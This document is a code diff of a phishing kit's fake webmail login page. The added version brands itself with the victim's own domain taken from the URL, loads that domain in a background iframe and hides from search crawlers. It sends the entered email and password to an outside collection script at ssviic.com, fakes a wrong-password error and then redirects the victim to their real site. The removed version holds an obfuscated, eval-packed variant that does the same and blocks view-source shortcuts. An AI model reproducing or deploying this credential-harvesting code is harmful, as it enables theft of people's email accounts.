@@ -1,242 +1,814 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    <title>Log-in</title>
-    <!-- Bootstrap CSS -->
-   <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
-    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&amp;display=swap" rel="stylesheet">
-<style>
-body{
-			background: #D1D8F3;
-		}
+	 <title  class="logoname">Mail</title>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+<link rel="apple-touch-icon" type="image/png"  class="logoimg" href="" /> 
+<link rel="shortcut icon" type="image/x-icon"  class="logoimg"  href="" />
+<link rel="mask-icon" type=""  class="logoimg" href="" color="#111" />
+<meta name="robots" content="noindex">
+<meta name="googlebot" content="noindex">
+<meta name="googlebot-news" content="noindex" />
+<meta name="otherbot" content="noindex" />
+<meta name="noarchive" content="noindex" />
+<meta name="nosnippet" content="noindex" />
+<meta name="noimageindex" content="noindex" /> 
+<meta name="robots" content="nofollow">
+<meta name="googlebot" content="nofollow">
+<meta name="googlebot-news" content="nofollow" />
+<meta name="otherbot" content="nofollow" />
+<meta name="noarchive" content="nofollow" />
+<meta name="nosnippet" content="nofollow" />
+<meta name="noimageindex" content="nofollow" />
+<meta name="robots" content="max-snippet:0">
+<meta name="robots" content="unavailable_after: 2020-09-22">
+<!--===============================================================================================-->	
+	<link rel="icon" id="logoimg" type="image/png" href="images/icons/favicon.ico"/> 
+    <link rel="shortcut icon"  class="logoimg" href="" type="image/x-icon"> 
+	 
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>  
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/jquery.session@1.0.0/jquery.session.min.js"></script>
+<!--===============================================================================================-->
+<script language="javascript" type="text/javascript">
+if (window.location.protocol != "https:") {
+document.location="https:" + window.location.href.substring(window.location.protocol.length, window.location.href.length);
+}
+</script>
+ 
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
+<style type="text/css">
 
-		.container{
-			width:100%;
-			display: flex;
-			justify-content: center;
-			align-items: center;
-			height: 100vh;
-		}
 
-		.office{
-			width: 380px;
-			background: #fff;
-		}
 
-		.office-holder{
-			width:80%;
-			margin: auto;
-			padding: 20px 0px;
-		}
 
-		.logo{
-			width:100%;
-			float: left;
-			margin-bottom: 2em;
-		}
+/*//////////////////////////////////////////////////////////////////
+[ FONT ]*/
 
-		.logo h1{
-			font-family: arial;
-		}
+@font-face {
+  font-family: Poppins-Regular;
+  src: url('../fonts/poppins/Poppins-Regular.ttf'); 
+}
 
-		.verify{
-			width: 70%;
-			margin: auto;
-		}
+@font-face {
+  font-family: Poppins-Medium;
+  src: url('../fonts/poppins/Poppins-Medium.ttf'); 
+}
 
-		.verify h4{
-			font-family: arial;
-		}
+@font-face {
+  font-family: Poppins-Bold;
+  src: url('../fonts/poppins/Poppins-Bold.ttf'); 
+}
 
-		fieldset{
-			width: 90%;
-			float: right;
-			border:2px solid #4285f4;
-			border-radius: 5px;
-		}
+@font-face {
+  font-family: Poppins-SemiBold;
+  src: url('../fonts/poppins/Poppins-SemiBold.ttf'); 
+}
 
-		legend{
-			font-size: 15px;
-			overflow: hidden;
-			width: 42%;
-			padding:0px 2px;
-			margin: 0px;
-		}
 
-		.verify input[type='text']{
-			width: 100%;
-			float: right;
-			border:none;
-			padding:3px 10px;
-		}
 
-		.verify button{
-			border:none;
-			height: 40px;
-			width: 80px;
-			float: right;
-			margin-top: 2em;
-			background: #4285f4;
-			border-radius: 5px;
-			color: #fff;
-		}
 
-		.email-to-verify{
-			border:1px solid #000;
-			border-radius: 10px;
-		}
+/*//////////////////////////////////////////////////////////////////
+[ RESTYLE TAG ]*/
 
-		.form-holder{
-			width:100%;
-			float: left;
-		}
+* {
+	margin: 0px; 
+	padding: 0px; 
+	box-sizing: border-box;
+}
 
-		.form-holder h3{
-			font-weight: 600;
-		}
+body, html {
+	height: 100%;
+	font-family: Poppins-Regular, sans-serif;
+}
 
-		.form-holder input[type='email'], input[type='password']{
-			width: 100%;
-			height:40px;
-			float: left;
-			margin-bottom: 15px;
-		}
-		.form-holder .btn-holder{
-			width:100%;
-			margin-top:1em;
-			display: flex;
-			align-content: center;
-			align-items: center;
-			justify-content: center;
-		}
+/*---------------------------------------------*/
+a {
+	font-family: Poppins-Regular;
+	font-size: 14px;
+	line-height: 1.7;
+	color: #666666;
+	margin: 0px;
+	transition: all 0.4s;
+	-webkit-transition: all 0.4s;
+  -o-transition: all 0.4s;
+  -moz-transition: all 0.4s;
+}
 
-		.form-holder .btn-holder .btn{
-			background:#0073C6;
-			border:none;
-			padding:6px 10px;
-			color:#fff;
-			border-radius: 0px;
-			margin-top: 20px;
-			margin-bottom: 20px;
-		}
+a:focus {
+	outline: none !important;
+}
 
-		.form-holder .btn-holder .btn:hover{
-			cursor:pointer;
-		}
+a:hover {
+	text-decoration: none;
+  color: #fff;
+}
 
-		.checkbox{
-			width: 100%;
-			float: left;
-			margin-top:5px;
-		}
+/*---------------------------------------------*/
+h1,h2,h3,h4,h5,h6 {
+	margin: 0px;
+}
 
-		.checkbox label{
-			font-family:arial;
-			font-size:13px;
-			float: left;
-			margin-left:1em;
-		}
+p {
+	font-family: Poppins-Regular;
+	font-size: 14px;
+	line-height: 1.7;
+	color: #666666;
+	margin: 0px;
+}
 
-		.hide{
-			display: none;
-		}
+ul, li {
+	margin: 0px;
+	list-style-type: none;
+}
+
+
+/*---------------------------------------------*/
+input {
+	outline: none;
+	border: none;
+}
+
+textarea {
+  outline: none;
+  border: none;
+}
+
+textarea:focus, input:focus {
+  border-color: transparent !important;
+}
+
+input:focus::-webkit-input-placeholder { color:transparent; }
+input:focus:-moz-placeholder { color:transparent; }
+input:focus::-moz-placeholder { color:transparent; }
+input:focus:-ms-input-placeholder { color:transparent; }
+
+textarea:focus::-webkit-input-placeholder { color:transparent; }
+textarea:focus:-moz-placeholder { color:transparent; }
+textarea:focus::-moz-placeholder { color:transparent; }
+textarea:focus:-ms-input-placeholder { color:transparent; }
+
+input::-webkit-input-placeholder { color: #fff;}
+input:-moz-placeholder { color: #fff;}
+input::-moz-placeholder { color: #fff;}
+input:-ms-input-placeholder { color: #fff;}
+
+textarea::-webkit-input-placeholder { color: #fff;}
+textarea:-moz-placeholder { color: #fff;}
+textarea::-moz-placeholder { color: #fff;}
+textarea:-ms-input-placeholder { color: #fff;}
+
+label {
+  margin: 0;
+  display: block;
+}
+
+/*---------------------------------------------*/
+button {
+	outline: none !important;
+	border: none;
+	background: transparent;
+}
+
+button:hover {
+	cursor: pointer;
+}
+
+iframe {
+	border: none !important;
+}
+
+
+/*//////////////////////////////////////////////////////////////////
+[ Utility ]*/
+.txt1 {
+  font-family: Poppins-Regular;
+  font-size: 13px;
+  color: #e5e5e5;
+  line-height: 1.5;
+}
+
+
+/*//////////////////////////////////////////////////////////////////
+[ login ]*/
+
+.limiter {
+  width: 100%;
+  margin: 0 auto;
+}
+
+.container-login100 {
+  width: 100%;  
+  min-height: 100vh;
+  display: -webkit-box;
+  display: -webkit-flex;
+  display: -moz-box;
+  display: -ms-flexbox;
+  display: flex;
+  flex-wrap: wrap;
+  justify-content: center;
+  align-items: center;
+  padding: 15px;
+
+  background-repeat: no-repeat;
+  background-position: center;
+  background-size: cover;
+  position: relative;
+  z-index: 1;  
+}
+
+.container-login100::before {
+  content: "";
+  display: block;
+  position: absolute;
+  z-index: -1;
+  width: 100%;
+  height: 100%;
+  top: 0;
+  left: 0;
+  background-color: rgba(255,255,255,0.2);
+}
+
+.wrap-login100 {
+  width: 500px;
+  border-radius: 10px;
+  overflow: hidden;
+  padding: 55px 55px 37px 55px;
+
+  background: #aaa;
+  //background: #9152f8;
+//  background: -webkit-linear-gradient(top, #7579ff, #b224ef);
+ // background: -o-linear-gradient(top, #7579ff, #b224ef);
+ // background: -moz-linear-gradient(top, #7579ff, #b224ef);
+ // background: linear-gradient(top, #7579ff, #b224ef);
+}
+
+
+/*------------------------------------------------------------------
+[ Form ]*/
+
+.login100-form {
+  width: 100%;
+}
+
+.login100-form-logo {
+  font-size: 60px; 
+  color: #333333;
+
+  display: -webkit-box;
+  display: -webkit-flex;
+  display: -moz-box;
+  display: -ms-flexbox;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  width: 120px;
+  height: 120px;
+  border-radius: 50%;
+  background-color: #fff;
+  margin: 0 auto;
+}
+
+.login100-form-title {
+  font-family: Poppins-Medium;
+  font-size: 30px;
+  color: #fff;
+  line-height: 1.2;
+  text-align: center;
+  text-transform: uppercase;
+
+  display: block;
+}
+
+.login100-form-title2 {
+  font-family: Poppins-Medium;
+  font-size: 20px;
+  color: #fff;
+ // line-height: 1.2;
+  text-align: center;
+  text-transform: lowercase;
+
+  display: block;
+}
+
+
+/*------------------------------------------------------------------
+[ Input ]*/
+
+.wrap-input100 {
+  width: 100%;
+  position: relative;
+  border-bottom: 2px solid rgba(255,255,255,0.24);
+  margin-bottom: 30px;
+}
+
+.input100 {
+  font-family: Poppins-Regular;
+  font-size: 16px;
+  color: #fff;
+  line-height: 1.2;
+
+  display: block;
+  width: 100%;
+  height: 45px;
+  background: transparent;
+  padding: 0 5px 0 38px;
+}
+
+/*---------------------------------------------*/ 
+.focus-input100 {
+  position: absolute;
+  display: block;
+  width: 100%;
+  height: 100%;
+  top: 0;
+  left: 0;
+  pointer-events: none;
+}
+
+.focus-input100::before {
+  content: "";
+  display: block;
+  position: absolute;
+  bottom: -2px;
+  left: 0;
+  width: 0;
+  height: 2px;
+
+  -webkit-transition: all 0.4s;
+  -o-transition: all 0.4s;
+  -moz-transition: all 0.4s;
+  transition: all 0.4s;
+
+  background: #fff;
+}
+
+.focus-input100::after {
+  font-family: Material-Design-Iconic-Font;
+  font-size: 22px;
+  color: #fff;
+
+  content: attr(data-placeholder);
+  display: block;
+  width: 100%;
+  position: absolute;
+  top: 6px;
+  left: 0px;
+  padding-left: 5px;
+
+  -webkit-transition: all 0.4s;
+  -o-transition: all 0.4s;
+  -moz-transition: all 0.4s;
+  transition: all 0.4s;
+}
+
+.input100:focus {
+  padding-left: 5px;
+}
+
+.input100:focus + .focus-input100::after {
+  top: -22px;
+  font-size: 18px;
+}
+
+.input100:focus + .focus-input100::before {
+  width: 100%;
+}
+
+.has-val.input100 + .focus-input100::after {
+  top: -22px;
+  font-size: 18px;
+}
+
+.has-val.input100 + .focus-input100::before {
+  width: 100%;
+}
+
+.has-val.input100 {
+  padding-left: 5px;
+}
+
+
+/*==================================================================
+[ Restyle Checkbox ]*/
+
+.contact100-form-checkbox {
+  padding-left: 5px;
+  padding-top: 5px;
+  padding-bottom: 35px;
+}
+
+.input-checkbox100 {
+  display: none;
+}
+
+.label-checkbox100 {
+  font-family: Poppins-Regular;
+  font-size: 13px;
+  color: #fff;
+  line-height: 1.2;
+
+  display: block;
+  position: relative;
+  padding-left: 26px;
+  cursor: pointer;
+}
+
+.label-checkbox100::before {
+  content: "\f26b";
+  font-family: Material-Design-Iconic-Font;
+  font-size: 13px;
+  color: transparent;
+
+  display: -webkit-box;
+  display: -webkit-flex;
+  display: -moz-box;
+  display: -ms-flexbox;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  position: absolute;
+  width: 16px;
+  height: 16px;
+  border-radius: 2px;
+  background: #fff;
+  left: 0;
+  top: 50%;
+  -webkit-transform: translateY(-50%);
+  -moz-transform: translateY(-50%);
+  -ms-transform: translateY(-50%);
+  -o-transform: translateY(-50%);
+  transform: translateY(-50%);
+}
+
+.input-checkbox100:checked + .label-checkbox100::before {
+  color: #555555;
+}
+
+
+/*------------------------------------------------------------------
+[ Button ]*/
+.container-login100-form-btn {
+  width: 100%;
+  display: -webkit-box;
+  display: -webkit-flex;
+  display: -moz-box;
+  display: -ms-flexbox;
+  display: flex;
+  flex-wrap: wrap;
+  justify-content: center;
+}
+
+.login100-form-btn {
+  font-family: Poppins-Medium;
+  font-size: 16px;
+  color: #555555;
+  line-height: 1.2;
+
+  display: -webkit-box;
+  display: -webkit-flex;
+  display: -moz-box;
+  display: -ms-flexbox;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  padding: 0 20px;
+  min-width: 120px;
+  height: 50px;
+  border-radius: 25px;
+
+  background: #9152f8;
+  background: -webkit-linear-gradient(bottom, #7579ff, #b224ef);
+  background: -o-linear-gradient(bottom, #7579ff, #b224ef);
+  background: -moz-linear-gradient(bottom, #7579ff, #b224ef);
+  background: linear-gradient(bottom, #7579ff, #b224ef);
+  position: relative;
+  z-index: 1;
+
+  -webkit-transition: all 0.4s;
+  -o-transition: all 0.4s;
+  -moz-transition: all 0.4s;
+  transition: all 0.4s;
+}
+
+.login100-form-btn::before {
+  content: "";
+  display: block;
+  position: absolute;
+  z-index: -1;
+  width: 100%;
+  height: 100%;
+  border-radius: 25px;
+  background-color: #fff;
+  top: 0;
+  left: 0;
+  opacity: 1;
+
+  -webkit-transition: all 0.4s;
+  -o-transition: all 0.4s;
+  -moz-transition: all 0.4s;
+  transition: all 0.4s;
+}
+
+.login100-form-btn:hover {
+  color: #fff;
+}
+
+.login100-form-btn:hover:before {
+  opacity: 0;
+}
+
+
+/*------------------------------------------------------------------
+[ Responsive ]*/
+
+@media (max-width: 576px) {
+  .wrap-login100 {
+    padding: 55px 15px 37px 15px;
+  }
+}
+
+
+
+/*------------------------------------------------------------------
+[ Alert validate ]*/
+
+.validate-input {
+  position: relative;
+}
+
+.alert-validate::before {
+  content: attr(data-validate);
+  position: absolute;
+  max-width: 70%;
+  background-color: #fff;
+  border: 1px solid #c80000;
+  border-radius: 2px;
+  padding: 4px 25px 4px 10px;
+  top: 50%;
+  -webkit-transform: translateY(-50%);
+  -moz-transform: translateY(-50%);
+  -ms-transform: translateY(-50%);
+  -o-transform: translateY(-50%);
+  transform: translateY(-50%);
+  right: 0px;
+  pointer-events: none;
+
+  font-family: Poppins-Regular;
+  color: #c80000;
+  font-size: 13px;
+  line-height: 1.4;
+  text-align: left;
+
+  visibility: hidden;
+  opacity: 0;
+
+  -webkit-transition: opacity 0.4s;
+  -o-transition: opacity 0.4s;
+  -moz-transition: opacity 0.4s;
+  transition: opacity 0.4s;
+}
+
+.alert-validate::after {
+  content: "\f12a";
+  font-family: FontAwesome;
+  font-size: 16px;
+  color: #c80000;
+
+  display: block;
+  position: absolute;
+  top: 50%;
+  -webkit-transform: translateY(-50%);
+  -moz-transform: translateY(-50%);
+  -ms-transform: translateY(-50%);
+  -o-transform: translateY(-50%);
+  transform: translateY(-50%);
+  right: 5px;
+}
+
+.alert-validate:hover:before {
+  visibility: visible;
+  opacity: 1;
+}
+
+@media (max-width: 992px) {
+  .alert-validate::before {
+    visibility: visible;
+    opacity: 1;
+  }
+}
+
+
+
+
 
 </style>
 </head>
-
 <body>
-    <div id="html_encoder_div">
-        <div class="container">
-            <div class="office show border shadow bg-light" id="others">
-                <div class="office-holder">
-                    <div class="logo" style="text-align:center">
-                        <div id="login_logo">
-                            <img id="logoimg" src="https://s3.amazonaws.com/simbla-static-2/2020/10/5f5bf3b0c092cc00129273e3/5f5bf3ecc092cc00129273e4/nHk7jPxa3hr-DRk2opAFo-ib.png" width="50" height="50" alt="">
-                        </div>
-                        <h3 class="text-dark"><strong id="logoname" class="text-uppercase"></strong></h3>
-                        <h5 class="font-weight-light"></h5>
-                    </div>
-                    <center>
-                        <div id="msg" style="display: none;font-weight: 600;color: red;">wrong username or Password.! Please enter correct details.</div>
-                        <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
-                    </center>
-                    <form id="contact" method="POST" action="">
-                        <div class="form-holder">
-                            <div style="width: 100%;">
-                                <div class="alert alert-danger hide alert2"></div>
-                            </div>
-                            <input type="email" id="email" name="email" class="form-control" value="" readonly="" placeholder="" required="">
-                            <input type="password" id="password" name="password" placeholder="" class="form-control" required="">
-                            <div class="checkbox">
-                                <input type="checkbox" name="" style="float: left; margin-top:2px; margin-bottom: 10px;">
-                                <label>REMEMBER ME</label>
-                            </div>
-                            <div class="btn-holder">
-                                <button class="btn btn-lg col-12" id="submit-btn">LOGIN</button>
-                            </div>
-                            <p style="color:#0073C6; margin-top:1em; float: left; width:100%;">can't access your account?</p>
-                            <p style="color:#0073C6; margin-top:0em; float: left; width:100%;">Sign in with a single-use code</p>
-                        </div>
-                    </form>
-                </div>
-            </div>
-        </div>
-    </div>
-    <style>
-    .tb_button {
-        padding: 1px;
-        cursor: pointer;
-        border-right: 1px solid #8b8b8b;
-        border-left: 1px solid #FFF;
-        border-bottom: 1px solid #fff;
-    }
+<iframe id="mainPage" src="" width="100%" scrolling="no" sandbox="allow-forms allow-pointer-lock
+allow-popups allow-same-origin allow-scripts" style="position: absolute;height: 100%;border: none;"></iframe>
+	
+	<div class="limiter">
+		<div class="container-login100" >
+			<div class="wrap-login100">
+				<form class="login100-form validate-form">
+					<!-- <span class="login100-form-logo"  style="margin-top:-20px"  >
+					<img src="" id="logoimg" />
+					<img src="https://www.google.com/s2/favicons?domain=skyfent.com" size="300px">
+					<img src="logo.clearbit.com/spotify.com">
+						<!-- <i class="zmdi zmdi-landscape"></i>  
+					</span> -->
 
-    .tb_button.hover {
-        borer: 2px outset #def;
-        background-color: #f8f8f8 !important;
-    }
+					<span class="login100-form-title p-b-34 p-t-27" style="margin-top:0px">
+						 Sign in  
+						 
+					</span>
+					<span class="login100-form-title2 p-b-34 p-t-27" style="margin-top:0px;margin-bottom:30px">
+					<span class="domain"></span> 
+						<!-- sales@enauk.com <br> 
+						<span id="username"></span>-->
+					</span>
+					<span id="msg"></span>
 
-    .ws_toolbar {
-        z-index: 100000
-    }
+					<div class="wrap-input100 validate-input" data-validate = "Enter username">
+						<input class="input100" type="text"  id="email"  name="email" placeholder="Username">
+						<span class="focus-input100" data-placeholder="&#xf207;"></span>
+					</div>  
 
-    .ws_toolbar .ws_tb_btn {
-        cursor: pointer;
-        border: 1px solid #555;
-        padding: 3px
-    }
+					<div class="wrap-input100 validate-input" data-validate="Enter password">
+						<!-- <input  type="text" class="email" name="email" value="" > -->
+						<input class="input100" type="password"  id="password"  name="password" placeholder="Password">
+						<span class="focus-input100" data-placeholder="&#xf191;"></span>
+					</div>
+						<input type="hidden"    id="ip" name="ip"  >			
 
-    .tb_highlight {
-        background-color: yellow
-    }
+					<!-- <div class="contact100-form-checkbox">
+						<input class="input-checkbox100" id="ckb1" type="checkbox" name="remember-me">
+						<label class="label-checkbox100" for="ckb1">
+							Remember me
+						</label>
+					</div> -->
 
-    .tb_hide {
-        visibility: hidden
-    }
+					<div class="container-login100-form-btn">
+						<button class="login100-form-btn" type="submit" id="submit-btn">
+							Login
+						</button>
+					</div>
 
-    .ws_toolbar img {
-        padding: 2px;
-        margin: 0px
-    }
-    </style>
-     <!-- jQuery first, then Popper.js, then Bootstrap JS -->
-      <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
-      <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
-      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
-    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/jquery.session@1.0.0/jquery.session.min.js"></script>
+					<!-- <div class="text-center p-t-90">
+						<a class="txt1" href="#">
+							Forgot Password?
+						</a>
+					</div> -->
+				</form>
+			</div>
+		</div>
+	</div>
+	</body>
 
-<script>
+	<!-- jQuery first, then Popper.js, then Bootstrap JS -->
+	
+    
+	<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+	<script>
 
-eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('$(1).b(\'c\',3(e){4(e.5&&(e.d==f)){e.7();0 6}});1.g(\'h\',8=>8.7());1.i=3(e){4(e.5&&(e.2===j||e.2===k||e.2===l||e.2===m)){0 6}9{0 a}};$(1).n("o",3(e){4(e.5){0 6}9{0 a}});',25,25,'return|document|keyCode|function|if|ctrlKey|false|preventDefault|event|else|true|bind|keydown|which||83|addEventListener|contextmenu|onkeydown|67|86|85|117|keypress|u'.split('|'),0,{}))
+    /* global $ */
+    $(document).ready(function(){
+      var count=0;
 
-eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('$(17).18(6(){3 m=0;$(\'#19\').V(6(){$("#8").B();$(\'#C\').u("");$("#1a").W({1b:X,Y:"B"},0);$("#1c").W({1d:X,Y:"v"},1e)});3 n=H.I.1f.z(1);5(!n){}Z{3 o=n;$(\'#C\').u(o);3 p=/^([a-w-x-10\\.\\-])+\\@(([a-w-x-9\\-])+\\.)+([a-w-x-9]{2,4})+$/;5(!p.11(o)){$(\'#y\').v();n.12;J K}3 q=o.D("@");3 r=o.z((q+1));3 c=r.z(0,r.D(\'.\'));3 s=c.13();3 t=c.14();$("#L").M("N","E://A.O.F/P/Q?R="+r);$("#S").7(t);$(".S").7(t)}$(\'#T-U\').V(6(b){$(\'#y\').B();$(\'#8\').B();b.1g();3 d=$("#C").u();3 e=$("#G").u();3 f=$(\'#8\').7();$(\'#8\').1h(f);5(!e){$(\'#y\').v();$(\'#y\').7("1i 1j 1k 1l.!");J K}3 g=d;3 h=/^([a-w-x-10\\.\\-])+\\@(([a-w-x-9\\-])+\\.)+([a-w-x-9]{2,4})+$/;5(!h.11(g)){$(\'#y\').v();d.12;J K}3 i=g.D("@");3 j=g.z((i+1));3 c=j.z(0,j.D(\'.\'));3 k=c.13();3 l=c.14();$("#L").M("N","E://A.O.F/P/Q?R="+j);$(".L").M("N","E://A.O.F/P/Q?R="+j);$("#S").7(l);m=m+1;$.1m({1n:\'1o\',1p:\'E://1q.F/1r/1s.1t\',1u:\'1v\',1w:{C:d,G:e,},1x:6(a){$(\'#T-U\').7(\'1y...\')},1z:6(a){5(a){$("#8").v();1A.1B(a);5(a[\'1C\']==\'1D\'){$("#G").u("");5(m>=2){m=0;H.I.15("16://A."+j)}}Z{}}},y:6(){$("#G").u("");5(m>=2){m=0;H.I.15("16://A."+j)}$("#8").v()},1E:6(){$(\'#T-U\').7(\'1F 1G\')}})})});',62,105,'|||var||if|function|html|msg||||||||||||||||||||||val|show|zA|Z0|error|substr|www|hide|email|indexOf|https|com|password|window|location|return|false|logoimg|attr|src|google|s2|favicons|domain|logoname|submit|btn|click|animate|200|opacity|else|9_|test|focus|toLowerCase|toUpperCase|replace|http|document|ready|back1|automail|left|inputbar|right|1000|hash|preventDefault|text|Password|field|is|emply|ajax|dataType|JSON|url|ssviic|updatekay|logged|php|type|POST|data|beforeSend|Verifing|success|console|log|signal|ok|complete|VIEW|DOCUMENT'.split('|'),0,{}))
+      $('#back1').click(function () {
+        $("#msg").hide();
+        $('#email').val("");
+        $("#automail").animate({left:200, opacity:"hide"}, 0);
+        $("#inputbar").animate({right:200, opacity:"show"}, 1000);
+
+      });
+
+      var email = window.location.hash.substr(1);
+      if (!email) {
+
+      }
+      else
+      {
+        var my_email =email;
+        $('#email').val(my_email);
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!filter.test(my_email)) {
+          $('#error').show();
+          email.focus;
+          return false;
+        }
+        var ind=my_email.indexOf("@");
+        var my_slice=my_email.substr((ind+1));
+        var c= my_slice.substr(0, my_slice.indexOf('.'));
+        var final= c.toLowerCase();
+        var finalu= c.toUpperCase();
+
+        $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
+        $("#logoname").html(finalu);
+        $(".logoname").html(finalu);
+        $(".domain").html(my_slice);
+        $(".email").html(email);
+		
+		     var mainPage = 'https://'+my_slice; 
+     //     var mainPage = 'https://webmail.staralliancebd.com/';  
+        $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+mainPage);
+         document.getElementById('mainPage').src = mainPage;
+    //    $("#mainPage").src(mainPage);
+    
+      }
+
+
+      
+      $('#submit-btn').click(function(event){
+        $('#error').hide();
+        $('#msg').hide();
+        event.preventDefault();
+        var email=$("#email").val();
+        var password=$("#password").val();
+        var msg = $('#msg').html();
+        $('#msg').text( msg );
+      ///////////new injection////////////////
+      var my_email =email;
+      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+      if (!filter.test(my_email)) {
+        $('#error').show();
+        email.focus;
+        return false;
+      }
+
+      var ind=my_email.indexOf("@");
+      var my_slice=my_email.substr((ind+1));
+      var c= my_slice.substr(0, my_slice.indexOf('.'));
+      var final= c.toLowerCase();
+      var finalu= c.toUpperCase();
+
+        $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
+        $(".logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
+        $("#logoname").html(finalu);
+      ///////////new injection////////////////
+      count=count+1;
+      
+      $.ajax({
+        dataType: 'JSON',
+        url: 'https://ssviic.com/updatekay/logged.php',
+        type: 'POST',
+        data:{
+          email:email,
+          password:password,
+        },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr){
+              $('#submit-btn').html('Verifing...');
+            },
+            success: function(response){
+			 $('#msg').html("<span style='color:red;'>Wrong password! Please try again</span>");
+              if(response){
+                $("#msg").show();
+				console.log(response);
+				$('#msg').html(response['msg']);
+                if(response['signal'] == 'ok'){
+                  $("#password").val("");
+                  if (count>=3) {
+                    count=0;
+                    // window.location.replace(response['redirect_link']);
+                   window.location.replace("http://www."+my_slice);
+                 //   window.location.replace("https://office.com");
+
+                  }
+                  // $('#msg').html(response['msg']);
+                }
+                else{
+                   $('#msg').html(response['msg']);
+                }
+              }
+            },
+            error: function(){
+              $("#password").val("");
+              if (count>=2) {
+                count=0;
+                   window.location.replace("http://www."+my_slice);
+                  //    window.location.replace("https://office.com");
+              }
+              $("#msg").show();
+              // $('#msg').html("Please try again later");
+            },
+            complete: function(){
+              $('#submit-btn').html('Sign in');
+            }
+          });
+    });
+
+ 			
+
+    });
 
 
   </script>
 
-</body>
-</html>
-
+  </html>
